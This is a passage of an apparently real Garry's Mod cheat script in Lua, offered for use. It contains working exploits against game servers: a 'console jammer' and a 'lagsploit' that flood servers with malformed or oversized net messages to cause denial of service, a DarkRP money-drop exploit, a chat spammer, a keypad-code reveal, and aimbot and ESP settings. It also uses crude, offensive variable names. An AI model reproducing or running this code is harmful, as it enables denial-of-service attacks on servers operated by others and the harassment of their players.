if GetConVarNumber("jav_keypadhax") == 1 then
local e = LocalPlayer():GetEyeTrace().Entity
if IsValid(e) and string.find(e:GetClass(), "keypad") then
local text = e.code or "Not Found"
draw.WordBox( 8, ScrW() / 2, ScrH() / 2, text, "Default", Color(50,50,75,100), Color(255,255,255,255) )
end
 
for k,v in pairs(ents.GetAll()) do
if IsValid(v) then
if string.find(v:GetClass(), "keypad") and not(string.find(v:GetClass(), "cracker") or string.find(v:GetClass(), "checker")) then
if v != e then
local pos = v:GetPos():ToScreen()
if IsValid(v) and v.code then
draw.RoundedBox( 4, pos.x-5, pos.y-5, 20, 20, Color( 0, 255, 0, 150 ) )
else
draw.RoundedBox( 4, pos.x-5, pos.y-5, 20, 20, Color( 255, 0, 0, 150 ) )
end
end
end
end
end
end
end)
 
/*------------------------------------------
Darkrp vomit cash exploit
------------------------------------------*/
 
local Vomiting = false
concommand.Add( "jav_vomitcash", function()
        Vomiting = !Vomiting
        if( Vomiting ) then
                timer.Create( "VomitCash", 2, 0, function()
                        RunConsoleCommand( "darkrp", "dropmoney", "5" )
                end )
        else
                timer.Destroy( "VomitCash" )
        end
end )
 
/*------------------------------------------
Console Jammer
------------------------------------------*/
 
local Jamming = false
local rape = "{Mins:[-1 -187.9984 -18.8426],Constraints:[],Maxs:[79.2153 126.62.3755 0.3711}}}}"
concommand.Add( "jav_console_jammer", function()
        Jamming = !Jamming
        if( Jamming ) then
                timer.Create( "JamConsole", 1, 0, function()
                    for i = 1, 100 do
                    net.Start( "ArmDupe" )
                    net.WriteUInt( 999999999999999999, 32 )
                    net.WriteData(rape,999999999999999999)
                    net.SendToServer()
                    end
                end )
        else
                timer.Destroy( "JamConsole" )
        end
end )
 
/*------------------------------------------
Chat Spammer
------------------------------------------*/
 
local chatshitting = false
concommand.Add( "jav_chatspam", function()
        chatshitting = !chatshitting
        if( chatshitting ) then
                timer.Create( "chatshit", 1, 0, function()
                        RunConsoleCommand( "say", GetConVarString("jav_chatspam_msg") )
                end )
        else
                timer.Destroy( "chatshit" )
        end
end )
 
/*------------------------------------------
Sandbox DOS Exploit (Created by legendofrobbo, based on the same theory as anubis's darkrp lagsploit)
------------------------------------------*/
 
local jav_LagSploit = CreateClientConVar("jav_lagsploit", 0, false, false)
hook.Add("CreateMove", "lagsploit", function ()
local lagsploitpower = (GetConVarNumber("jav_lagsploit_power") )
    if(GetConVarNumber("jav_lagsploit") == 1 ) then
        for i=0, lagsploitpower do
 
        net.Start( "ArmDupe" )
            net.WriteUInt( 0, 32 )        
            net.WriteData( "", 0 )
        net.SendToServer()
 
        end
    end
end)
 
/*------------------------------------------
Convars
------------------------------------------*/
 
CreateClientConVar("jav_esp_enabled",0,true,false)
CreateClientConVar("jav_esp_distance",100,true,false)
CreateClientConVar("jav_xray_distance",50,true,false)
CreateClientConVar("jav_esp_position",1,true,false)
CreateClientConVar("jav_esp_velocity",0,true,false)
CreateClientConVar("jav_esp_names",1,true,false)
CreateClientConVar("jav_esp_box",0,true,false)
CreateClientConVar("jav_esp_showtargetdistance",0,true,false)
CreateClientConVar("jav_esp_admin",1,true,false)
CreateClientConVar("jav_esp_budget",0,true,false)
CreateClientConVar("jav_bhop_enabled",0,true,false)
CreateClientConVar("jav_mirror_enabled",0,true,false)
CreateClientConVar("jav_crosshair_enabled",1,true,false)
CreateClientConVar("jav_flashlight_enabled",0,true,false)
CreateClientConVar("jav_murderhax",0,true,false)
CreateClientConVar("jav_ttthax",0,true,false)
CreateClientConVar("jav_triggerbot_enabled",0,true,false)
CreateClientConVar("jav_witness_enabled",0,true,false)
CreateClientConVar("jav_autoaim_enabled",0,true,false)
CreateClientConVar("jav_aa_targetfriends",1,true,false)
CreateClientConVar("jav_aa_targetteam",1,true,false)
CreateClientConVar("jav_aa_angle",25,true,false)
CreateClientConVar("jav_aa_headshot",1,true,false)
CreateClientConVar("jav_aa_snaponaim",0,true,false)
CreateClientConVar("jav_aa_snaponaimgrace",0.5,true,false)
CreateClientConVar("jav_aa_ignorewalls",0,true,false)
CreateClientConVar("jav_aa_autoshoot",0,true,false)
CreateClientConVar("jav_scanner_enabled",0,true,false)
CreateClientConVar("jav_entfinder_distance",100,true,false)
CreateClientConVar("jav_keypadhax",0,true,false)
CreateClientConVar("jav_lagsploit_power",80,true,false)
CreateClientConVar("jav_autoclick_enabled",0,true,false)
CreateClientConVar("jav_chatbot",0,true,false)
CreateClientConVar("jav_chatspam_msg","Your tears are currently being harvested by http://steamcommunity.com/groups/mluminge",true,false)
CreateClientConVar("jav_colour_r",255,true,false)
CreateClientConVar("jav_colour_g",150,true,false)
CreateClientConVar("jav_colour_b",0,true,false)
CreateClientConVar("jav_radar_enabled",0,true,false)
CreateClientConVar("jav_radar_size",250,true,false)
CreateClientConVar("jav_radar_fov",50,true,false)
 
/*
orginal lagsploit code
 
 
local aic_DarkRPLagSploit = CreateClientConVar("aic_darkrp_lagsploit", 0, false, false)
hook.Add("Think", "aic_sploit01", function ( )
    if((aic_DarkRPLagSploit:GetInt() == 1) and (gmod:GetGamemode().Name == "DarkRP")) then
        for i=0,800do
        net.Start("DarkRP_preferredjobmodel")
        net.WriteUInt(-8, 8)
        net.WriteString("\n\n\n\n\t\t\t\t\t\n\n\n\n\n\n\n")
        net.SendToServer()
       
        net.Start("DarkRP_spawnPocket")
        net.WriteFloat(-0.1)
        net.SendToServer()
        end
    end
end)
 
cvars.AddChangeCallback("aic_darkrp_lagsploit", function( cVar, oVal, nVal )
    if((tostring(nVal) == "1") and (gmod:GetGamemode().Name != "DarkRP")) then
        if(aic_Notifications:GetString() == "1") then
            Output("Warning! This exploit targets DarkRP.")
            aic_Notifications:SetString("0")
        end
    end
end)
 
*/
 
local function javRadar()
    if GetConVarNumber("jav_radar_enabled") == 1 then
        local size = GetConVarNumber("jav_radar_size")
        local fov = GetConVarNumber("jav_radar_fov")
        local x = ScrW() - size - 5
        local y = 5
 
        surface.SetDrawColor(Color(0, 0, 0, 150))
        surface.DrawRect(x, y, size, size)
        x = x - 2
        surface.SetDrawColor(GColScheme)
        surface.DrawRect(x, y, size, 2)
        surface.DrawRect(x, y, 2, size)
        surface.DrawRect(x + size - 1, y, 2, size)
        surface.DrawRect(x, y + (size - 2), size, 2)
        surface.DrawRect((x -2)+ (size/2), (y-2) + (size/2), 4, 4)
--                if GD.bools["radar_cross"] then
--                    g.surface.DrawRect(x + size - (size * 0.50), y, 1, size)
--                    g.surface.DrawRect(x, y + size - (size * 0.50), size, 1)
--                end
 
        for key, ply in pairs(player.GetAll()) do
            if ply ~= LocalPlayer() and ply:Alive() and team.GetName(ply:Team()) ~= "Spectators" then
                local lx = LocalPlayer():GetPos().x - ply:GetPos().x
                local ly = LocalPlayer():GetPos().y - ply:GetPos().y
                local ang = EyeAngles().y
                local cos = math.cos(math.rad(-ang))
                local sin = math.sin(math.rad(-ang))
                local px = (ly * cos) + (lx * sin)
                local py = (lx * cos) - (ly * sin)
                px = px / fov
                py = py / fov
                px = math.Clamp(px, -(size * 0.50), size * 0.50)
                py = math.Clamp(py, -(size * 0.50), size * 0.50)
                        local col = GColScheme
                        local name = player.GetAll()[key]:Nick()
                        draw.SimpleText(name, "default", x + size - (size * 0.50) + px - 13, y + size - (size * 0.50) + py - 7, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                        surface.SetDrawColor(GColScheme)
                        surface.DrawRect(x + size - (size * 0.50) + px, y + size - (size * 0.50) + py, 3, 3)
                        --surface.DrawRect(x + size - (size * 0.50) + px, y + size - (size * 0.50) + py - 3, 1, 7)
 
            end
 
        end
 
    end
end
hook.Add("HUDPaint", "jav_radar", javRadar)